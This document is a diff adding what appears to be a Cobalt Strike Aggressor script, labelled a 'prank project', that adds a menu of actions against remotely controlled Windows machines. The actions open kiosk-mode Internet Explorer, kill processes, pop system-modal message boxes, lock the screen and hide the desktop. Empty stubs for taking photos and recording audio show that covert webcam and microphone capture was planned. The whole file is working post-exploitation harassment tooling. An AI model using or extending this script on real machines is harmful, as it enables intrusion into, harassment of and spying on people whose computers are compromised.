@@ -1,0 +1,43 @@
+# 恶搞项目
+
+menu "Have Fun" {
+    item "打开全屏IE" {
+        prompt_text("使用IE打开某站", "https://baidu.com", lambda({
+            binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+            bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
+        }, @ids => $1));
+    }
+
+    item "关闭全屏IE" {
+        bshell($1, "taskkill /F /IM iexplore.exe");
+    }
+
+    item "弹框框" {
+        prompt_text("Alert", "你好！", lambda({
+            bpowershell(@ids, 'Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox("' . $1 . '", "OKOnly,MsgBoxSetForeground,SystemModal,Exclamation", "")' );
+            
+            blog(@ids,"发送消息: $1 ");
+        }, @ids => $1));
+    }
+
+    item "锁屏" {
+        bshell($1, "rundll32.exe user32.dll,LockWorkStation");
+    }
+
+    item "隐藏桌面" {
+        bshell($1, "taskkill /F /IM explorer.exe");
+    }
+
+    item "恢复桌面" {
+        brun($1, "explorer.exe");
+    }
+
+    item "拍照" {
+
+    }
+
+    item "录音" {
+
+    }
+
+} 
